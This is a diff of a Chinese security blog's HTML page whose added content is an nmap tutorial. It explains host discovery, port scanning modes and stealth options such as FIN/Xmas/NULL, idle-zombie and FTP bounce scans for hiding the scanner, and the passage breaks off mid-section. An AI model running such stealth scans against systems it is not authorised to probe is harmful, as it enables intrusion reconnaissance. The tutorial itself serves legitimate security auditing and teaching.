@@ -1,715 +1,1143 @@
 <!DOCTYPE html>
-<html lang="en">
-
-<!-- Head tag -->
+<html>
 <head><meta name="generator" content="Hexo 3.8.0">
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="follow your heart!fly your dream!">
-    <meta name="keyword" content="">
-    <meta name="theme-color" content="#600090">
-    <meta name="msapplication-navbutton-color" content="#600090">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
-    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
-    <link rel="alternate" type="application/atom+xml" title="拾荒者CD" href="/atom.xml">
-    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
-    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
-    <title>
-        
-        
-        
-    </title>
+  <meta charset="utf-8">
+  
 
-    <link rel="canonical" href="http://gumeng.fun/page/2/">
-
-    <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="/css/bootstrap.min.css">
-
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="/css/blog-style.css">
-
-    <!-- Pygments Github CSS -->
-    <link rel="stylesheet" href="/css/syntax.css">
+  
+  <title>拾荒者CD</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="follow your heart!fly your dream!">
+<meta name="keywords" content="Pwn,ICS,Python">
+<meta property="og:type" content="website">
+<meta property="og:title" content="拾荒者CD">
+<meta property="og:url" content="http://gumeng.fun/page/2/index.html">
+<meta property="og:site_name" content="拾荒者CD">
+<meta property="og:description" content="follow your heart!fly your dream!">
+<meta property="og:locale" content="En">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="拾荒者CD">
+<meta name="twitter:description" content="follow your heart!fly your dream!">
+  
+    <link rel="alternate" href="/atom.xml" title="拾荒者CD" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
 <link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
-
-<style>
-
-    header.intro-header {
-        background-image: url('')
-    }
-</style>
-<!-- hack iOS CSS :active style -->
-<body ontouchstart="" class="animated fadeIn">
-<!-- Navigation -->
-<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="false" data-istags="false
-" data-ishome="true">
-    <div class="container-fluid">
-        <!-- Brand and toggle get grouped for better mobile display -->
-        <div class="navbar-header page-scroll">
-            <button type="button" class="navbar-toggle">
-                <span class="sr-only">Toggle navigation</span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-            </button>
-            <a class="navbar-brand animated pulse" href="/">
-                <span class="brand-logo">
-                    拾荒者CD
-                </span>
-                's Blog
-            </a>
-        </div>
-
-        <!-- Collect the nav links, forms, and other content for toggling -->
-        <!-- Known Issue, found by Hux:
-            <nav>'s height woule be hold on by its content.
-            so, when navbar scale out, the <nav> will cover tags.
-            also mask any touch event of tags, unfortunately.
-        -->
-        <!-- /.navbar-collapse -->
-        <div id="huxblog_navbar">
-            <div class="navbar-collapse">
-                <ul class="nav navbar-nav navbar-right">
-                    <li>
-                        <a href="/">Home</a>
-                    </li>
-					
-                    
-                        
-							
-                        <li>
-                            <a href="/aboutme/">关于我和我的博客</a>
-                        </li>
-							
-						
-                    
-                        
-							
-								
-							
-						
-                    
-					
-					
-						<li>
-							<a href="/about">About</a>
-						</li>
-					
-                </ul>
-            </div>
-        </div>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">拾荒者CD</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Pwner in ICS/Linux,Linux amateur, Python Exploit developer/addict</a>
+        </h2>
+      
     </div>
-    <!-- /.container -->
-</nav>
-<script>
-    // Drop Bootstarp low-performance Navbar
-    // Use customize navbar with high-quality material design animation
-    // in high-perf jank-free CSS3 implementation
-//    var $body   = document.body;
-    var $toggle = document.querySelector('.navbar-toggle');
-    var $navbar = document.querySelector('#huxblog_navbar');
-    var $collapse = document.querySelector('.navbar-collapse');
-
-    $toggle.addEventListener('click', handleMagic)
-    function handleMagic(e){
-        if ($navbar.className.indexOf('in') > 0) {
-        // CLOSE
-            $navbar.className = " ";
-            // wait until animation end.
-            setTimeout(function(){
-                // prevent frequently toggle
-                if($navbar.className.indexOf('in') < 0) {
-                    $collapse.style.height = "0px"
-                }
-            },400)
-        }else{
-        // OPEN
-            $collapse.style.height = "auto"
-            $navbar.className += " in";
-        }
-    }
-</script>
-
-<!-- Main Content -->
-
-
-<style>
-
-    .custom-haojen-container .post-preview:nth-of-type(1),
-    .custom-haojen-container .post-preview-poetry:nth-of-type(1) {
-        text-align: center;
-        background-repeat: no-repeat;
-        border-radius: 3px;
-        background-size: cover;
-        padding: 0;
-        height: 300px;
-        display: table;
-        width: 100%;
-        background-color: rgba(0, 0, 0, 0.16);
-    }
-
-    /*去掉诗歌的背景图片*/
-    .custom-haojen-container .post-preview-poetry:nth-of-type(1) {
-        background-image: none !important;
-        background-color: rgba(255, 248, 220, 0.5);
-    }
-
-    .custom-haojen-container .post-preview:nth-child(1) h2,
-    .custom-haojen-container .post-preview:nth-child(1) .post-meta,
-    .custom-haojen-container .post-preview:nth-child(1) .post-subtitle {
-        text-shadow: 0 0 40px rgba(0, 0, 0, 1);
-        letter-spacing: 1px;
-        color: #fff;
-        margin-top: 0;
-        padding-left: 60px;
-        padding-right: 60px;
-    }
-
-    .custom-haojen-container .post-preview:nth-child(1) .post-meta {
-        font-size: .9em;
-        font-weight: 300;
-        margin-top: 0;
-    }
-
-    .custom-haojen-container .post-preview-poetry:nth-child(1) .post-subtitle {
-        letter-spacing: 6px;
-        font-size: 18px;
-        font-family: unset;
-        font-weight: 400;
-        color: rgba(0, 0, 0, .75)
-    }
-
-    /*不显示摘要*/
-    .custom-haojen-container .post-preview:nth-child(1) .post-content-preview {
-        display: none
-    }
-
-    /*只第一个显示背景图片*/
-    .custom-haojen-container .post-preview:not(:nth-child(1)) {
-        background-image: none !important;
-    }
-
-    /*第一个分界线去掉*/
-    .custom-haojen-container hr:nth-of-type(1) {
-        display: none;
-    }
-
-    /*主题*/
-    .custom-haojen-container .post-preview:nth-of-type(1) > a {
-        display: table-cell;
-        vertical-align: middle;
-    }
-
-    /*诗词标题*/
-    .custom-haojen-container .post-preview-poetry:nth-child(1) h2 {
-        font-size: 35px;
-        font-family: STKaiti;
-        color: rgba(0, 0, 0, .8);
-    }
-
-    .custom-haojen-container .post-preview-poetry:nth-of-type(1) .post-meta {
-        color: #0e2231;
-    }
-
-    @media (max-width: 768px) {
-        .custom-haojen-container .post-preview:nth-child(1) {
-            height: 240px;
-        }
-
-        .custom-haojen-container .post-preview-poetry:nth-child(1) h2 {
-            font-size: 28px !important;
-            margin-top: 0;
-        }
-
-        .custom-haojen-container .post-preview:nth-child(1) .post-subtitle {
-            font-size: 18px;
-            font-weight: 400;
-            padding-left: 0;
-            padding-right: 0;
-        }
-
-        .custom-haojen-container .post-preview:nth-of-type(1) > a {
-            padding: 20px
-        }
-    }
-
-    /*手机屏幕*/
-    @media (max-width: 400px) {
-        .custom-haojen-container .post-preview:nth-child(1) {
-            height: 195px;
-        }
-
-        .custom-haojen-container .post-preview-poetry:nth-child(1) h2 {
-            font-size: 20px !important;
-        }
-
-        .custom-haojen-container .post-preview:nth-child(1) .post-subtitle {
-            font-size: 16px;
-        }
-
-        .custom-haojen-container .post-preview:nth-child(1) a {
-            padding: 30px 20px;
-        }
-    }
-</style>
-
-<!-- Page Header -->
-<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 visible-xs-block visible-sm-block">
-    <div class="row">
-        <header class="intro-header">
-            <div class="container">
-                <div class="site-heading text-center">
-                    <div class="about-me">
-                        <!--移动端头部显示-->
-                        <img src="">
-                        <h5><a href="/about/">拾荒者CD</a></h5>
-                        <p></p>
-                    </div>
-                </div>
-            </div>
-        </header>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://gumeng.fun"></form>
+      </div>
     </div>
-</div>
-<!-- Main Content -->
-<div class="container custom-haojen-container">
-    <!-- Post Container -->
-    <div class="row">
-        <div class="col-lg-8 col-lg-offset-1 col-md-8 col-md-offset-1 col-sm-12 col-xs-12 post-container">
-            <!-- Main Content -->
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-20200215-nmap使用方法" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/15/20200215-nmap使用方法/" class="article-date">
+  <time datetime="2020-02-15T01:50:08.000Z" itemprop="datePublished">2020-02-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/tools/">tools</a>
+  </div>
 
-
-
-<div class="post-preview " style="background-image: url('')">
-    <a href="/2020/02/15/20200215-如何搭建pwn环境/">
-        <h2 class="post-title">
-            如何搭建Pwn利用环境
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-15
-        </p>
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
         
-        <div class="post-content-preview">
-            <p>
-                
-前人栽树，后人乘凉
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/02/15/20200215-nmap使用方法/">nmap使用方法</a>
+    </h1>
+  
 
-socat 使用方法socat 简介本身socat是加强版的nc工具，可以借助nc获得本地测试的TCP、UDP接口，主要用于Pwn题目的部署工作，方便重启
-安装socat工具在ubuntu 16.04 安装socat工具，直接使用apt-get即可（记得保证权限满足）：
-..
-            </p>
-        </div>
-    </a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Nmap扫描原理与用法</p>
+<h1 id="1-Nmap介绍"><a href="#1-Nmap介绍" class="headerlink" title="1     Nmap介绍"></a>1     Nmap介绍</h1><p>Nmap扫描原理与用法PDF：下载地址</p>
+<p>Nmap是一款开源免费的网络发现（Network Discovery）和安全审计（Security Auditing）工具。软件名字Nmap是Network Mapper的简称。Nmap最初是由Fyodor在1997年开始创建的。随后在开源社区众多的志愿者参与下，该工具逐渐成为最为流行安全必备工具之一。最新版的Nmap6.0在2012年5月21日发布，详情请参见：<a href="http://www.nmap.org。" target="_blank" rel="noopener">www.nmap.org。</a></p>
+<p>一般情况下，Nmap用于列举网络主机清单、管理服务升级调度、监控主机或服务运行状况。Nmap可以检测目标机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。</p>
+<p>Nmap的优点：</p>
+<p>1.灵活。支持数十种不同的扫描方式，支持多种目标对象的扫描。</p>
+<p>2.强大。Nmap可以用于扫描互联网上大规模的计算机。</p>
+<p>3.可移植。支持主流操作系统：Windows/Linux/Unix/MacOS等等；源码开放，方便移植。</p>
+<p>4.简单。提供默认的操作能覆盖大部分功能，基本端口扫描nmap targetip，全面的扫描nmap –A targetip。</p>
+<p>5.自由。Nmap作为开源软件，在GPL License的范围内可以自由的使用。</p>
+<p>6.文档丰富。Nmap官网提供了详细的文档描述。Nmap作者及其他安全专家编写了多部Nmap参考书籍。</p>
+<p>7.社区支持。Nmap背后有强大的社区团队支持。</p>
+<p>8.赞誉有加。获得很多的奖励，并在很多影视作品中出现（如黑客帝国2、Die Hard4等）。</p>
+<p>9.流行。目前Nmap已经被成千上万的安全专家列为必备的工具之一。</p>
+<h2 id="1-1-Zenmap"><a href="#1-1-Zenmap" class="headerlink" title="1.1    Zenmap"></a>1.1    Zenmap</h2><p>Zenmap是Nmap官方提供的图形界面，通常随Nmap的安装包发布。Zenmap是用Python语言编写而成的开源免费的图形界面，能够运行在不同操作系统平台上（Windows/linux/Unix/Mac OS等）。Zenmap旨在为nmap提供更加简单的操作方式。简单常用的操作命令可以保存成为profile，用户扫描时选择profile即可；可以方便地比较不同的扫描结果；提供网络拓扑结构(NetworkTopology)的图形显示功能。</p>
+<p>其中Profile栏位，用于选择“Zenmap默认提供的Profile”或“用户创建的Profile”；Command栏位，用于显示选择Profile对应的命令或者用户自行指定的命令；Topology选项卡，用于显示扫描到的目标机与本机之间的拓扑结构。</p>
+<h2 id="1-2-功能架构图"><a href="#1-2-功能架构图" class="headerlink" title="1.2    功能架构图"></a>1.2    功能架构图</h2><p>Nmap包含四项基本功能：</p>
+<p>主机发现（Host Discovery）</p>
+<p>端口扫描（Port Scanning）</p>
+<p>版本侦测（Version Detection）</p>
+<p>操作系统侦测（Operating System Detection）</p>
+<p>而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。</p>
+<h1 id="2-Nmap基本扫描方法"><a href="#2-Nmap基本扫描方法" class="headerlink" title="2     Nmap基本扫描方法"></a>2     Nmap基本扫描方法</h1><p>Nmap主要包括四个方面的扫描功能，主机发现、端口扫描、应用与版本侦测、操作系统侦测。在详细讲解每个具体功能之前，首先可以看看Nmap的典型用法。</p>
+<h2 id="2-1-用法引入"><a href="#2-1-用法引入" class="headerlink" title="2.1    用法引入"></a>2.1    用法引入</h2><h3 id="2-1-1-确定端口状况"><a href="#2-1-1-确定端口状况" class="headerlink" title="2.1.1    确定端口状况"></a>2.1.1    确定端口状况</h3><p>如果直接针对某台计算的IP地址或域名进行扫描，那么Nmap对该主机进行主机发现过程和端口扫描。该方式执行迅速，可以用于确定端口的开放状况。</p>
+<p>命令形式:</p>
+<p>nmap targethost</p>
+<p>可以确定目标主机在线情况及端口基本状况。</p>
+<h3 id="2-1-2-完整全面的扫描"><a href="#2-1-2-完整全面的扫描" class="headerlink" title="2.1.2    完整全面的扫描"></a>2.1.2    完整全面的扫描</h3><p>如果希望对某台主机进行完整全面的扫描，那么可以使用nmap内置的-A选项。使用了改选项，nmap对目标主机进行主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描。</p>
+<p>命令形式：</p>
+<p>nmap –T4 –A –v targethost</p>
+<p>其中-A选项用于使用进攻性（Aggressive）方式扫描；-T4指定扫描过程使用的时序（Timing），总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况良好的情况推荐使用T4；-v表示显示冗余（verbosity）信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态。</p>
+<p>例如，扫描局域网内地址为192.168.1.100的电脑。显而易见，扫描出的信息非常丰富，在对192.168.1.100的扫描报告部分中（以红框圈出），可以看到主机发现的结果“Host is up”；端口扫描出的结果，有996个关闭端口，4个开放端口（在未指定扫描端口时，Nmap默认扫描1000个最有可能开放的端口）；而版本侦测针对扫描到的开放状况进一步探测端口上运行的具体的应用程序和版本信息；OS侦测对该目标主机的设备类型与操作系统进行探测；而绿色框图是nmap调用NSE脚本进行进一步的信息挖掘的显示结果。</p>
+<h2 id="2-2-主机发现"><a href="#2-2-主机发现" class="headerlink" title="2.2    主机发现"></a>2.2    主机发现</h2><p>主机发现（Host Discovery），即用于发现目标主机是否在线（Alive，处于开启状态）。</p>
+<h3 id="2-2-1-主机发现原理"><a href="#2-2-1-主机发现原理" class="headerlink" title="2.2.1    主机发现原理"></a>2.2.1    主机发现原理</h3><p>主机发现发现的原理与Ping命令类似，发送探测包到目标主机，如果收到回复，那么说明目标主机是开启的。Nmap支持十多种不同的主机探测方式，比如发送ICMP ECHO/TIMESTAMP/NETMASK报文、发送TCPSYN/ACK包、发送SCTP INIT/COOKIE-ECHO包，用户可以在不同的条件下灵活选用不同的方式来探测目标机。</p>
+<p>主机发现基本原理：（以ICMP echo方式为例）</p>
+<p>Nmap的用户位于源端，IP地址192.168.0.5，向目标主机192.168.0.3发送ICMP Echo Request。如果该请求报文没有被防火墙拦截掉，那么目标机会回复ICMP Echo Reply包回来。以此来确定目标主机是否在线。</p>
+<p>默认情况下，Nmap会发送四种不同类型的数据包来探测目标主机是否在线。</p>
+<ol>
+<li><p>ICMP echo request</p>
+</li>
+<li><p>a TCP SYN packet to port 443</p>
+</li>
+<li><p>a TCP ACK packet to port 80</p>
+</li>
+<li><p>an ICMP timestamp request</p>
+</li>
+</ol>
+<p>依次发送四个报文探测目标机是否开启。只要收到其中一个包的回复，那就证明目标机开启。使用四种不同类型的数据包可以避免因防火墙或丢包造成的判断错误。</p>
+<h3 id="2-2-2-主机发现的用法"><a href="#2-2-2-主机发现的用法" class="headerlink" title="2.2.2    主机发现的用法"></a>2.2.2    主机发现的用法</h3><p>通常主机发现并不单独使用，而只是作为端口扫描、版本侦测、OS侦测先行步骤。而在某些特殊应用（例如确定大型局域网内活动主机的数量），可能会单独专门适用主机发现功能来完成。</p>
+<p>不管是作为辅助用法还是专门用途，用户都可以使用Nmap提供的丰富的选项来定制主机发现的探测方式。</p>
+<p>[plain]view plaincopy</p>
+<p>-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现。</p>
+<p>-sn: Ping Scan 只进行主机发现，不进行端口扫描。</p>
+<p>-Pn: 将所有指定的主机视作开启的，跳过主机发现的过程。</p>
+<p>-PS/PA/PU/PY[portlist]: 使用TCPSYN/ACK或SCTP INIT/ECHO方式进行发现。</p>
+<p>-PE/PP/PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。-PO[protocollist]: 使用IP协议包探测对方主机是否开启。</p>
+<p>-n/-R: -n表示不进行DNS解析；-R表示总是进行DNS解析。</p>
+<p>–dns-servers : 指定DNS服务器。</p>
+<p>–system-dns: 指定使用系统的DNS服务器</p>
+<p>–traceroute: 追踪每个路由节点</p>
+<p>其中，比较常用的使用的是-sn，表示只单独进行主机发现过程；-Pn表示直接跳过主机发现而进行端口扫描等高级操作（如果已经确知目标主机已经开启，可用该选项）；-n，如果不想使用DNS或reverse DNS解析，那么可以使用该选项。</p>
+<h3 id="2-2-3-使用演示"><a href="#2-2-3-使用演示" class="headerlink" title="2.2.3    使用演示"></a>2.2.3    使用演示</h3><p>探测scanme.nmap.org</p>
+<p>下面以探测scanme.nmap.org的主机为例，简单演示主机发现的用法。</p>
+<p>命令如下：</p>
+<p>nmap –sn –PE –PS80,135 –PU53 scanme.nmap.org</p>
+<p>使用Wireshark抓包，我们看到，scanme.nmap.org 的IP地址182.140.147.57发送了四个探测包：ICMPEcho，80和135端口的TCP SYN包，53端口的UDP包（DNS domain）。而收到ICMP Echo的回复与80端口的回复。从而确定了scanme.nmap.org主机正常在线。</p>
+<p>探测局域网内活动主机</p>
+<p>扫描局域网192.168.1.100-192.168.1.120范围内哪些IP的主机是活动的。</p>
+<p>命令如下：</p>
+<p>nmap –sn 192.168.1.100-120</p>
+<p>从结果中，可以看到这个IP范围内有三台主机处于活动状态。</p>
+<p>从Wireshark抓取的包中，可以看到发送的探测包的情况：</p>
+<p>在局域网内，Nmap是通过ARP包来询问IP地址上的主机是否活动的，如果收到ARP回复包，那么说明主机在线。</p>
+<p>例如，某条ARP回复的报文详细信息如下：</p>
+<h2 id="2-3-端口扫描"><a href="#2-3-端口扫描" class="headerlink" title="2.3    端口扫描"></a>2.3    端口扫描</h2><p>端口扫描是Nmap最基本最核心的功能，用于确定目标主机的TCP/UDP端口的开放情况。</p>
+<p>默认情况下，Nmap会扫描1000个最有可能开放的TCP端口。</p>
+<p>Nmap通过探测将端口划分为6个状态：</p>
+<p>open：端口是开放的。</p>
+<p>closed：端口是关闭的。</p>
+<p>filtered：端口被防火墙IDS/IPS屏蔽，无法确定其状态。</p>
+<p>unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。</p>
+<p>open|filtered：端口是开放的或被屏蔽。</p>
+<p>closed|filtered ：端口是关闭的或被屏蔽。</p>
+<h3 id="2-3-1-端口扫描原理"><a href="#2-3-1-端口扫描原理" class="headerlink" title="2.3.1    端口扫描原理"></a>2.3.1    端口扫描原理</h3><p>Nmap在端口扫描方面非常强大，提供了十多种探测方式。</p>
+<h4 id="2-3-1-1-TCP-SYN-scanning"><a href="#2-3-1-1-TCP-SYN-scanning" class="headerlink" title="2.3.1.1    TCP SYN scanning"></a>2.3.1.1    TCP SYN scanning</h4><p>这是Nmap默认的扫描方式，通常被称作半开放扫描（Half-open scanning）。该方式发送SYN到目标端口，如果收到SYN/ACK回复，那么判断端口是开放的；如果收到RST包，说明该端口是关闭的。如果没有收到回复，那么判断该端口被屏蔽（Filtered）。因为该方式仅发送SYN包对目标主机的特定端口，但不建立的完整的TCP连接，所以相对比较隐蔽，而且效率比较高，适用范围广。</p>
+<p>TCP SYN探测到端口关闭：</p>
+<p>TCP SYN探测到端口开放：</p>
+<h4 id="2-3-1-2-TCP-connect-scanning"><a href="#2-3-1-2-TCP-connect-scanning" class="headerlink" title="2.3.1.2    TCP connect scanning"></a>2.3.1.2    TCP connect scanning</h4><p>TCP connect方式使用系统网络API connect向目标主机的端口发起连接，如果无法连接，说明该端口关闭。该方式扫描速度比较慢，而且由于建立完整的TCP连接会在目标机上留下记录信息，不够隐蔽。所以，TCP connect是TCP SYN无法使用才考虑选择的方式。</p>
+<p>TCP connect探测到端口关闭：</p>
+<p>TCP connect探测到端口开放：</p>
+<h4 id="2-3-1-3-TCP-ACK-scanning"><a href="#2-3-1-3-TCP-ACK-scanning" class="headerlink" title="2.3.1.3    TCP ACK scanning"></a>2.3.1.3    TCP ACK scanning</h4><p>向目标主机的端口发送ACK包，如果收到RST包，说明该端口没有被防火墙屏蔽；没有收到RST包，说明被屏蔽。该方式只能用于确定防火墙是否屏蔽某个端口，可以辅助TCP SYN的方式来判断目标主机防火墙的状况。</p>
+<p>TCP ACK探测到端口被屏蔽：</p>
+<p>TCP ACK探测到端口未被屏蔽：</p>
+<h4 id="2-3-1-4-TCP-FIN-Xmas-NULL-scanning"><a href="#2-3-1-4-TCP-FIN-Xmas-NULL-scanning" class="headerlink" title="2.3.1.4    TCP FIN/Xmas/NULL scanning"></a>2.3.1.4    TCP FIN/Xmas/NULL scanning</h4><p>这三种扫描方式被称为秘密扫描（Stealthy Scan），因为相对比较隐蔽。FIN扫描向目标主机的端口发送的TCP FIN包或Xmas tree包/Null包，如果收到对方RST回复包，那么说明该端口是关闭的；没有收到RST包说明端口可能是开放的或被屏蔽的（open|filtered）。</p>
+<p>其中Xmas tree包是指flags中FIN URG PUSH被置为1的TCP包；NULL包是指所有flags都为0的TCP包。</p>
+<p>TCP FIN探测到主机端口是关闭的：</p>
+<p>TCP FIN探测到主机端口是开放或屏蔽的：</p>
+<h4 id="2-3-1-5-UDP-scanning"><a href="#2-3-1-5-UDP-scanning" class="headerlink" title="2.3.1.5    UDP scanning"></a>2.3.1.5    UDP scanning</h4><p>UDP扫描方式用于判断UDP端口的情况。向目标主机的UDP端口发送探测包，如果收到回复“ICMP port unreachable”就说明该端口是关闭的；如果没有收到回复，那说明UDP端口可能是开放的或屏蔽的。因此，通过反向排除法的方式来断定哪些UDP端口是可能出于开放状态。</p>
+<p>UDP端口关闭：</p>
+<p>UDP端口开放或被屏蔽：</p>
+<h4 id="2-3-1-6-其他方式"><a href="#2-3-1-6-其他方式" class="headerlink" title="2.3.1.6    其他方式"></a>2.3.1.6    其他方式</h4><p>除上述几种常用的方式之外，Nmap还支持多种其他探测方式。例如使用SCTP INIT/COOKIE-ECHO方式来探测SCTP的端口开放情况；使用IP protocol方式来探测目标主机支持的协议类型（TCP/UDP/ICMP/SCTP等等）；使用idle scan方式借助僵尸主机（zombie host，也被称为idle host，该主机处于空闲状态并且它的IPID方式为递增。详细实现原理参见：<a href="http://nmap.org/book/idlescan.html）来扫描目标在主机，达到隐蔽自己的目的；或者使用FTP" target="_blank" rel="noopener">http://nmap.org/book/idlescan.html）来扫描目标在主机，达到隐蔽自己的目的；或者使用FTP</a> bounce scan，借助FTP允许的代理服务扫描其他的主机，同样达到隐藏自己的身份的目的。</p>
+<h3 id="2-3-2-端口扫描用法"><a href="#2-3-2-端口扫描用法" class="headerlink" title="2.3.2    端口扫描用法"></a>2.3.2    端口扫描用法</h3><p>端口扫描用法比较简单，Nmap提供丰富的命令行参数来指定扫描方式和扫描端口。</p>
+<p>具体可以参见如下描述。</p>
+<h4 id="2-3-2-1-扫描方式选项"><a href="#2-3-2-1-扫描方式选项" class="headerlink" title="2.3.2.1    扫描方式选项"></a>2.3.2.1    扫描方式选项</h4><p>[plain]view plaincopy</p>
+<p>-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描。</p>
+<p>-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况。</p>
+<p>-sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态。</p>
+<p>–scanflags : 定制TCP包的flags。</p>
+<p>-sI : 指定使用idle scan方式来扫描目标主机（前提需要找到合适的zombie host）</p>
+<p>-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况。</p>
+<p>-sO: 使用IP protocol 扫描确定目标机支持的协议类型。</p>
+<p>-b : 使用FTP bounce scan扫描方式</p>
+<h4 id="2-3-2-2-端口参数与扫描顺序"><a href="#2-3-2-2-端口参数与扫描顺序" class="headerlink" title="2.3.2.2    端口参数与扫描顺序"></a>2.3.2.2    端口参数与扫描顺序</h4><p>[plain]view plaincopy</p>
+<p>-p : 扫描指定的端口</p>
+<p>实例: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9（其中T代表TCP协议、U代表UDP协议、S代表SCTP协议）</p>
+<p>-F: Fast mode – 快速模式，仅扫描TOP 100的端口</p>
+<p>-r: 不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防火墙检测到）。</p>
+<p>–top-ports :扫描开放概率最高的number个端口（nmap的作者曾经做过大规模地互联网扫描，以此统计出网络上各种端口可能开放的概率。以此排列出最有可能开放端口的列表，具体可以参见文件：nmap-services。默认情况下，nmap会扫描最有可能的1000个TCP端口）</p>
+<p>–port-ratio : 扫描指定频率以上的端口。与上述–top-ports类似，这里以概率作为参数，让概率大于–port-ratio的端口才被扫描。显然参数必须在在0到1之间，具体范围概率情况可以查看nmap-services文件。</p>
+<h3 id="2-3-3-端口扫描演示"><a href="#2-3-3-端口扫描演示" class="headerlink" title="2.3.3    端口扫描演示"></a>2.3.3    端口扫描演示</h3><p>这里，我们以扫描局域网内192.168.1.100主机为例。</p>
+<p>命令如下：</p>
+<p>nmap –sS –sU –T4 –top-ports 300 192.168.1.100</p>
+<p>参数-sS表示使用TCP SYN方式扫描TCP端口；-sU表示扫描UDP端口；-T4表示时间级别配置4级；–top-ports 300表示扫描最有可能开放的300个端口（TCP和UDP分别有300个端口）。</p>
+<p>从上图中，我们看到扫描结果，横线处写明有共有589端口是关闭的；红色框图中列举出开放的端口和可能是开放的端口。</p>
+<h2 id="2-4-版本侦测"><a href="#2-4-版本侦测" class="headerlink" title="2.4    版本侦测"></a>2.4    版本侦测</h2><p>版本侦测，用于确定目标主机开放端口上运行的具体的应用程序及版本信息。</p>
+<p>Nmap提供的版本侦测具有如下的优点：</p>
+<p>高速。并行地进行套接字操作，实现一组高效的探测匹配定义语法。</p>
+<p>尽可能地确定应用名字与版本名字。</p>
+<p>支持TCP/UDP协议，支持文本格式与二进制格式。</p>
+<p>支持多种平台服务的侦测，包括Linux/Windows/Mac OS/FreeBSD等系统。</p>
+<p>如果检测到SSL，会调用openSSL继续侦测运行在SSL上的具体协议（如HTTPS/POP3S/IMAPS）。</p>
+<p>如果检测到SunRPC服务，那么会调用brute-force RPC grinder进一步确定RPC程序编号、名字、版本号。</p>
+<p>支持完整的IPv6功能，包括TCP/UDP，基于TCP的SSL。</p>
+<p>通用平台枚举功能（CPE）</p>
+<p>广泛的应用程序数据库（nmap-services-probes）。目前Nmap可以识别几千种服务的签名，包含了180多种不同的协议。</p>
+<h3 id="2-4-1-版本侦测原理"><a href="#2-4-1-版本侦测原理" class="headerlink" title="2.4.1    版本侦测原理"></a>2.4.1    版本侦测原理</h3><p>简要的介绍版本的侦测原理。</p>
+<p>版本侦测主要分为以下几个步骤：</p>
+<p>首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。</p>
